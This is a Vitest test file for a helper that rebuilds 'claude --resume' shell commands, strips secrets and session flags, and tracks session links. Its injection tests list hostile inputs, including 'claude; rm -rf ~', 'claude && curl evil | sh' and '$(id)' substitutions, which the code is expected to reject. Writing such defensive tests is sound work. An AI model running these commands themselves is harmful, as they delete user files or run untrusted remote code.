import { describe, expect, it } from "vitest";
import {
  buildClaudeResumeCommand,
  claudeLaunch,
  isClaudePrintMode,
  nextClaudeLink,
  normalizeClaudeCommand,
} from "./claudeSession";

const ID = "2b1f9a4e-6c1d-4f7e-9a3b-0c5d8e7f1a2b";

describe("buildClaudeResumeCommand", () => {
  it("falls back to a bare resume without a launch command", () => {
    expect(buildClaudeResumeCommand(undefined, ID)).toBe(
      `claude --resume ${ID}`,
    );
    expect(buildClaudeResumeCommand("   ", ID)).toBe(`claude --resume ${ID}`);
  });

  it("keeps the launch flags and appends the resume", () => {
    expect(
      buildClaudeResumeCommand(
        "claude --dangerously-skip-permissions --model opus",
        ID,
      ),
    ).toBe(`claude --dangerously-skip-permissions --model opus --resume ${ID}`);
    expect(buildClaudeResumeCommand("claude --model=sonnet", ID)).toBe(
      `claude --model=sonnet --resume ${ID}`,
    );
  });

  it("strips every earlier session selection", () => {
    const cases = [
      "claude -r old-id",
      "claude --resume old-id",
      "claude --resume=old-id",
      "claude -r",
      "claude --resume",
      "claude -c",
      "claude --continue",
      "claude --session-id old-id",
      "claude --session-id=old-id",
      "claude -p",
      "claude --print",
      "claude --fork-session --resume old-id",
    ];
    for (const command of cases) {
      expect(buildClaudeResumeCommand(command, ID)).toBe(
        `claude --resume ${ID}`,
      );
    }
    expect(
      buildClaudeResumeCommand("claude --resume old-id --model opus", ID),
    ).toBe(`claude --model opus --resume ${ID}`);
  });

  it("drops a positional prompt so it is not sent again", () => {
    expect(buildClaudeResumeCommand("claude fix", ID)).toBe(
      `claude --resume ${ID}`,
    );
    expect(buildClaudeResumeCommand("claude --verbose fix", ID)).toBe(
      `claude --verbose --resume ${ID}`,
    );
  });

  it("keeps a path, alias and wrapper", () => {
    expect(buildClaudeResumeCommand("/opt/bin/claude", ID)).toBe(
      `/opt/bin/claude --resume ${ID}`,
    );
    expect(buildClaudeResumeCommand("claude-enigma --verbose", ID)).toBe(
      `claude-enigma --verbose --resume ${ID}`,
    );
    expect(buildClaudeResumeCommand("npx claude", ID)).toBe(
      `npx claude --resume ${ID}`,
    );
  });

  it("never retypes an env assignment, which can carry a secret", () => {
    expect(
      buildClaudeResumeCommand(
        "ANTHROPIC_API_KEY=sk-ant-123 claude --model opus",
        ID,
      ),
    ).toBe(`claude --model opus --resume ${ID}`);
    expect(
      buildClaudeResumeCommand("CLAUDE_CONFIG_DIR=/x A=1 npx claude", ID),
    ).toBe(`npx claude --resume ${ID}`);
  });

  it("does not take an assignment ending in claude for the program", () => {
    expect(buildClaudeResumeCommand("PATH=/tmp/evil/claude", ID)).toBe(
      `claude --resume ${ID}`,
    );
    expect(buildClaudeResumeCommand("npx FOO=/x/claude", ID)).toBe(
      `claude --resume ${ID}`,
    );
  });

  it("falls back rather than retype anything a shell would interpret", () => {
    for (const command of [
      "claude; rm -rf ~",
      "claude && curl evil | sh",
      "claude $(id)",
      "claude `id`",
      'claude "quoted prompt"',
      "claude > out.txt",
      "claude *",
      "env FOO=1 claude",
      "rm -rf claude",
      "sudo claude",
    ]) {
      expect(buildClaudeResumeCommand(command, ID)).toBe(
        `claude --resume ${ID}`,
      );
    }
  });

  it("refuses an id that is not plain id characters", () => {
    for (const id of ["", "a;b", "$(id)", "a b", "a\nb", "x".repeat(129)]) {
      expect(buildClaudeResumeCommand("claude", id)).toBeNull();
    }
  });
});

describe("normalizeClaudeCommand", () => {
  it("stores the launch without env assignments or session flags", () => {
    expect(
      normalizeClaudeCommand(
        "ANTHROPIC_API_KEY=sk-ant-123 claude --model opus --resume old",
      ),
    ).toBe("claude --model opus");
    expect(normalizeClaudeCommand("claude; echo sk-ant-123")).toBeUndefined();
    expect(normalizeClaudeCommand(undefined)).toBeUndefined();
  });

  it("builds a launch record that keeps no secret but remembers print mode", () => {
    const launch = claudeLaunch("ANTHROPIC_API_KEY=sk-ant-123 claude -p hi");
    expect(launch).toEqual({ command: "claude", print: true, linked: false });
    expect(JSON.stringify(launch)).not.toContain("sk-ant");
  });
});

describe("claudeLaunch", () => {
  it("drops a command the shell may have cut off at its 256 character cap", () => {
    const long = `claude --model opus ${"--verbose ".repeat(30)}`.slice(0, 256);
    expect(long).toHaveLength(256);
    expect(claudeLaunch(long).command).toBeUndefined();
    expect(claudeLaunch(long.slice(0, 255)).command).toMatch(
      /^claude --model opus --verbose/,
    );
    expect(claudeLaunch(`${long} -p`).print).toBe(true);
  });
});

describe("isClaudePrintMode", () => {
  it("spots print mode in either spelling", () => {
    expect(isClaudePrintMode("claude -p hello")).toBe(true);
    expect(isClaudePrintMode("claude --print")).toBe(true);
    expect(isClaudePrintMode("claude --model opus")).toBe(false);
  });
});

describe("nextClaudeLink", () => {
  const OTHER = "9c0d1e2f-0000-4000-8000-000000000001";

  it("links the first session of a fresh launch with its command", () => {
    expect(
      nextClaudeLink(
        undefined,
        { command: "claude --model opus", print: false, linked: false },
        { sessionId: ID, source: "startup" },
      ),
    ).toEqual({ sessionId: ID, command: "claude --model opus" });
  });

  it("replaces a stale link when a new launch starts", () => {
    expect(
      nextClaudeLink(
        { sessionId: OTHER, command: "claude" },
        { command: "claude", print: false, linked: false },
        { sessionId: ID, source: "startup" },
      ),
    ).toEqual({ sessionId: ID, command: "claude" });
  });

  it("ignores a nested startup inside a running session", () => {
    const current = { sessionId: ID, command: "claude" };
    expect(
      nextClaudeLink(
        current,
        { command: "claude", print: false, linked: true },
        { sessionId: OTHER, source: "startup" },
      ),
    ).toBeNull();
    expect(
      nextClaudeLink(current, undefined, {
        sessionId: OTHER,
        source: "startup",
      }),
    ).toBeNull();
  });

  it("follows clear, resume and compact within the running session", () => {
    const current = { sessionId: ID, command: "claude --verbose" };
    for (const source of ["clear", "resume", "compact"]) {
      expect(
        nextClaudeLink(
          current,
          { command: "claude --verbose", print: false, linked: true },
          { sessionId: OTHER, source },
        ),
      ).toEqual({ sessionId: OTHER, command: "claude --verbose" });
    }
  });

  it("keeps the link when a launch with no known command reports startup", () => {
    const current = { sessionId: ID, command: "claude" };
    const unknown = { print: false, linked: false };
    expect(
      nextClaudeLink(current, unknown, { sessionId: OTHER, source: "startup" }),
    ).toBeNull();
    expect(
      nextClaudeLink(undefined, unknown, {
        sessionId: OTHER,
        source: "startup",
      }),
    ).toEqual({ sessionId: OTHER });
    expect(
      nextClaudeLink(current, unknown, { sessionId: OTHER, source: "resume" }),
    ).toEqual({ sessionId: OTHER, command: "claude" });
  });

  it("links without a known launch and keeps the earlier command", () => {
    expect(
      nextClaudeLink(undefined, undefined, {
        sessionId: ID,
        source: "startup",
      }),
    ).toEqual({ sessionId: ID });
    expect(
      nextClaudeLink(
        { sessionId: OTHER, command: "claude --verbose" },
        undefined,
        {
          sessionId: ID,
          source: "resume",
        },
      ),
    ).toEqual({ sessionId: ID, command: "claude --verbose" });
  });

  it("never links print mode or an unsafe id", () => {
    expect(
      nextClaudeLink(undefined, claudeLaunch("claude -p hi"), {
        sessionId: ID,
        source: "startup",
      }),
    ).toBeNull();
    expect(
      nextClaudeLink(undefined, undefined, { sessionId: "a;b" }),
    ).toBeNull();
  });
});
